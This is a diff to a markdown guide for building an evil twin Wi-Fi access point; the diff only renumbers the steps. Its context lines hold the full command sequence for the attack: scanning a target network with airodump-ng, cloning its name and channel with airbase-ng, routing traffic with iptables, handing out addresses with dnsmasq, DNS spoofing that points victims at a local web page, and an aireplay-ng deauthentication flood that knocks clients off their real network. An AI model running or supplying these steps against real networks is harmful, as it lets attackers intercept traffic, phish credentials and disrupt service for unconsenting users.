@@ -81,11 +81,11 @@ This document outlines the steps we took in order to setup an evil twin access p
 	When you see it hit `ctrl+c` and then copy that line to a text file.
 	Copy down the BSSID (MAC address), CH (channel), and ESSID (Wireless access point name) values.
 
-9. Now for fun, take a look at the devices connected to that network.  
+10. Now for fun, take a look at the devices connected to that network.  
 	Enter the BSSID from the previous step in this command
 	`airodump-ng -d <BSSID> wlan1mon`
 
-9. Lets boost our signal strength, to the max legal limit in the US.  
+11. Lets boost our signal strength, to the max legal limit in the US.  
 	Note that not all wireless adapters support this.
 	```
 	ifconfig wlan1mon down     
@@ -94,16 +94,16 @@ This document outlines the steps we took in order to setup an evil twin access p
 	```
 	Again check the signal strength with `iwconfig wlan1mon`
 
-9. start up the evil twin AP (access point)  
+12. start up the evil twin AP (access point)  
 	Give the evil twin the same name as the network you are attacking on the same channel.
 	`airbase-ng -e "EvilTwinName" -c 11 wlan1mon`
 	At this point you should be able to see your evil network listed under the available wireless networks on your phone or computer. 
 
-10. Give the evil twin can access the internet.  
+13. Give the evil twin can access the internet.  
 	`ifconfig at0`
 	give at0 an ip address: `ifconfig at0 10.0.0.1 up`
 
-11. route all traffic through the at0 interface.  
+14. route all traffic through the at0 interface.  
 	The device wlan0, or eth0 in the second line, must be the interface connected to the internet for this to work. It must be a different interface than the monitoring device.
 	```
 	iptables --flush
@@ -116,28 +116,28 @@ This document outlines the steps we took in order to setup an evil twin access p
 	`sudo update-alternatives --config iptables`
 	Select the `/usr/sbin/iptables-legacy 10 manual mode` option
 
-12. enable port forwarding  
+15. enable port forwarding  
 	`echo 1 > /proc/sys/net/ipv4/ip_forward`
 
-13. evil twin is now setup, now need to allocate ip addresses to clients  
+16. evil twin is now setup, now need to allocate ip addresses to clients  
 	`dnsmasq -C /root/Desktop/dnsmasq.conf -d`
 	Congratulations, you have setup hotspot for yourself.
 
-14. Now we can start a local Apache webserver that we can redirect traffic to.  
+17. Now we can start a local Apache webserver that we can redirect traffic to.  
 	Place a webpage under `/var/www/html/index.html`. Ours is named index.html. 
 	Start the server: `sudo /etc/init.d/apache2 start`
 
-15. Your apache server is running locally. Record the IP address  
+18. Your apache server is running locally. Record the IP address  
 	`hostname -I` will give you your devices ip address. Additionally you can use localhost which is `127.0.0.1`
 
-15. Now we can do some dns spoofing.  
+19. Now we can do some dns spoofing.  
 	Create a file `config/dnsspoof.conf`
 	Add urls you want to spoof to it. For example this will redirect anyone trying to visit http://www.example.com to our local apache server. 
 	`127.0.0.1	example.com`
 	Note that the ip address and url must be separated by a tab, not spaces.
 	You can add as many lines like this as you like for redirecting traffic.
 
-16. Now deauthorize clients so they connect to our network instead of their legit network.  
+20. Now deauthorize clients so they connect to our network instead of their legit network.  
 	`aireplay-ng –deauth 0 -a <BSSID> wlan1mon`
 
 
